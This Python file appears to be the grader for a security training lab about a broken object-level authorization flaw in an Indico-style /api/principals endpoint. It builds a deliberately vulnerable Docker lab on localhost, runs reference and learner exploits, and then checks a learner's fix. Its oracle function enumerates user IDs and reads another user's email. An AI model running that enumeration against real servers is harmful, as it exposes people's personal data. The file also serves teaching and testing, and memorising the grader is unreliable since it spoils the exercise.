#!/usr/bin/env python3
"""Verifier Lab 32: Indico BOLA /api/principals -> PII exposure."""

import json
import os
import subprocess
import sys
import time
from http.client import HTTPConnection

LAB = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
passed, failed = 0, 0

ANALYST = ("analyst@lab.test", "analyst-pw")
ANALYST_UID = "User:100"
TARGET_UID = "User:1"


def check(name, cond, got=""):
    global passed, failed
    if cond:
        passed += 1
        print("  [LULUS] %s -- dapat %s" % (name, got))
    else:
        failed += 1
        print("  [GAGAL] %s -- dapat %s" % (name, got))


def sh(cmd):
    return subprocess.run(cmd, cwd=LAB, capture_output=True, text=True, timeout=300)


def req(method, path, body=None, token=None):
    c = HTTPConnection(HOST, PORT, timeout=10)
    h = {}
    if token:
        h["Authorization"] = "Bearer " + token
    c.request(method, path,
              body=json.dumps(body).encode() if body else None, headers=h)
    r = c.getresponse()
    raw = r.read()
    try:
        data = json.loads(raw or b"{}")
    except Exception:
        data = {}
    c.close()
    return r.status, data


def wait_ready(timeout=90):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            s, _ = req("POST", "/login", {"email": ANALYST[0], "password": ANALYST[1]})
            if s == 200:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False


def login(email, password):
    s, d = req("POST", "/login", {"email": email, "password": password})
    return d.get("token", "") if s == 200 else ""


def parse_contract(out):
    d = {}
    for line in out.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            d[k.strip()] = v.strip()
    return d


def run_exploit(path):
    p = subprocess.run([sys.executable, path], capture_output=True,
                       text=True, timeout=120)
    return p.returncode, p.stdout, p.stderr


def oracle_count():
    """Hitung independen: enumerasi User:1..20 sebagai analyst."""
    tok = login(*ANALYST)
    if not tok:
        return -1, ""
    n = 0
    email1 = ""
    for i in range(1, 21):
        s, d = req("POST", "/api/principals", {"values": ["User:%d" % i]}, token=tok)
        if s != 200:
            return -1, ""
        entry = d.get("User:%d" % i, {})
        if not entry.get("invalid"):
            n += 1
            if i == 1:
                email1 = entry.get("email", "")
    return n, email1


def contract_ok(d):
    if d.get("STATUS") != "200":
        return False, "STATUS=%r" % d.get("STATUS")
    n, email1 = oracle_count()
    if n < 0:
        return False, "oracle gagal"
    if d.get("COUNT") != str(n):
        return False, "COUNT=%r (server: %d)" % (d.get("COUNT"), n)
    if not email1 or d.get("EMAIL1") != email1:
        return False, "EMAIL1 tidak cocok data asli"
    return True, "%d user ter-enumerasi" % n


def fase1():
    print("== FASE 1: membangun lab PRISTINE (rentan) ==")
    sh(["docker", "compose", "down"])
    sh(["docker", "compose", "up", "--build", "-d"])
    print("menunggu lab siap di 127.0.0.1:8080 ...")
    if not wait_ready():
        check("lab siap", False, "timeout")
        return
    tok = login(*ANALYST)
    check("baseline: login analyst -> token", bool(tok), "token" if tok else "gagal")
    s, d = req("GET", "/me", token=tok)
    check("baseline: /me -> User:100", s == 200 and d.get("user_id") == ANALYST_UID,
          d.get("user_id"))
    s, d = req("POST", "/api/principals", {"values": [ANALYST_UID]}, token=tok)
    own = d.get(ANALYST_UID, {})
    check("baseline: resolve diri sendiri -> 200 + email",
          s == 200 and own.get("email") == ANALYST[0], s)
    s, d = req("POST", "/api/principals", {"values": ["User:999"]}, token=tok)
    check("baseline: ID tak dikenal -> invalid", s == 200 and d.get("User:999", {}).get("invalid") is True, s)
    s, d = req("POST", "/api/principals", {"values": [ANALYST_UID]})
    check("baseline: tanpa token -> 401", s == 401, s)

    print("== [HEALTH] serangan referensi: enumerasi principals ==")
    rc, out, err = run_exploit(os.path.join(LAB, "solutions", "exploit.py"))
    d = parse_contract(out)
    ok, got = contract_ok(d) if rc == 0 else (False, "rc=%d" % rc)
    check("serangan referensi: kontrak STATUS/COUNT/EMAIL1", ok, got)

    print("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    p = os.path.join(LAB, "exploit", "exploit.py")
    try:
        src = open(p).read()
    except FileNotFoundError:
        src = ""
    if "NotImplementedError" in src:
        check("exploit: sudah dikerjakan (bukan scaffold)", False, "masih scaffold")
        return
    rc, out, err = run_exploit(p)
    d = parse_contract(out)
    check("exploit: STATUS 200", d.get("STATUS") == "200", repr(d.get("STATUS")))
    ok, got = contract_ok(d) if rc == 0 else (False, "rc=%d" % rc)
    check("exploit: enumerasi terbukti via oracle server", ok, got)


def fase2():
    print("== FASE 2: cek scaffold fix ==")
    pristine = open(os.path.join(LAB, "app", "app.py"), "rb").read()
    fixed = open(os.path.join(LAB, "fix", "app", "app.py"), "rb").read()
    check("fix: fix/app/app.py sudah diubah (tidak identik pristine)",
          pristine != fixed, "identik" if pristine == fixed else "berbeda")
    if pristine == fixed:
        return
    print("== FASE 2: membangun lab dengan FIX ==")
    sh(["docker", "compose", "-f", "docker-compose.yml",
        "-f", "docker-compose.fix.yml", "up", "--build", "-d"])
    print("menunggu lab siap di 127.0.0.1:8080 ...")
    if not wait_ready():
        check("lab siap", False, "timeout")
        return
    tok = login(*ANALYST)
    s, d = req("POST", "/api/principals", {"values": [TARGET_UID]}, token=tok)
    invalid = s == 200 and d.get(TARGET_UID, {}).get("invalid") is True
    check("serangan referensi GAGAL: User:1 -> invalid", invalid, s)
    leaked = s == 200 and bool(d.get(TARGET_UID, {}).get("email"))
    check("serangan referensi GAGAL: tidak ada PII bocor", not leaked,
          "bersih" if not leaked else "bocor!")
    s, d = req("POST", "/api/principals", {"values": [ANALYST_UID]}, token=tok)
    own = d.get(ANALYST_UID, {})
    check("fungsi normal: resolve diri sendiri -> 200 + email",
          s == 200 and own.get("email") == ANALYST[0], s)
    s, d = req("POST", "/api/principals", {"values": ["User:999"]}, token=tok)
    check("fungsi normal: ID tak dikenal -> invalid", s == 200 and d.get("User:999", {}).get("invalid") is True, s)
    s, d = req("POST", "/api/principals", {"values": [ANALYST_UID]})
    check("fungsi normal: tanpa token -> 401", s == 401, s)
    print("== FASE 2: menjalankan serangan referensi terhadap fix ==")
    rc, out, err = run_exploit(os.path.join(LAB, "solutions", "exploit.py"))
    d = parse_contract(out)
    ok, _ = contract_ok(d)
    check("serangan referensi GAGAL total (tidak ada kontrak valid)",
          rc != 0 or not ok, "rc=%d" % rc)


if __name__ == "__main__":
    fase1()
    fase2()
    print("== HASIL: %d/%d cek lulus ==" % (passed, passed + failed))
    sh(["docker", "compose", "down"])
    sys.exit(0 if failed == 0 else 1)
